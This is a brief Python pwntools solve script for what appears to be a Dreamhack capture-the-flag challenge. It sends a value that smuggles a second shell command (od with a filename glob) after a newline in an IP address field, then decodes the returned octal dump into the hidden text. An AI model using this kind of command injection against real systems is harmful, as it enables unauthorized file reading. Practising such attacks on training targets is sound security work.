from pwn import *

context.binary = elf = ELF('./main')
context.arch = "amd64"
context.log_level = "debug"

HOST, PORT = "host3.dreamhack.games 22393".split()

if args.REMOTE:
    p = remote(HOST, PORT)
elif args.DOCKER:
    p = remote('localhost', 5000)
else:
    p = process()

p.sendline(b'127.0.0.1\nod ????.???')

# 알고리즘 실력이 후달리는 관계로 수동 리스트 완성...했다가 정규식으로 구하는 코드를 뒤늦게 작성
list = [
    0o030502, 0o032116, 0o054522, 0o054573, 0o072460, 0o041537, 0o072064, 0o064143,
    0o062063, 0o043537, 0o066541, 0o074507, 0o066165, 0o052137, 0o067151, 0o057571,
    0o064520, 0o063556, 0o006575, 0o000012
]

result = b''
for i in list:
    byte1 = i & 0xff
    byte2 = (i >> 8) & 0xff
    result += bytes([byte1, byte2])

print(result)
print(result.decode('ascii', errors='ignore'))